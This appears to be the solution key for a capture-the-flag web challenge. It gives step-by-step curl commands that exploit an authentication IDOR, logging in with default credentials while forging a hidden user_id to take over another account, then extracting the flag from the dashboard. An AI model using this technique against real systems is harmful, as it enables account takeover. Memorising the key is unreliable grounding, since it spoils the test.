# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: IDOR during authentication + default creds. The
`/password/<username>` POST validates the password correctly, but then trusts an
attacker-supplied hidden `user_id` field to decide which account id goes into the
session. Log in as `test`/`test` but claim a different `user_id` to become another
user.

1. **Log in** as `test`/`test` while injecting a different `user_id` (enumerate
   nearby IDs like 10001 to find the one whose dashboard holds the flag):

   ```
   curl -s -c cookies.txt -b cookies.txt -X POST "http://<target>/password/test" \
     -d "username=test&user_id=10001&password=test"
   ```

2. **Load the dashboard** with that session:

   ```
   curl -s -b cookies.txt "http://<target>/dashboard"
   ```

3. **Extract the flag** (`FLAG{...}`) from the dashboard and report it verbatim.
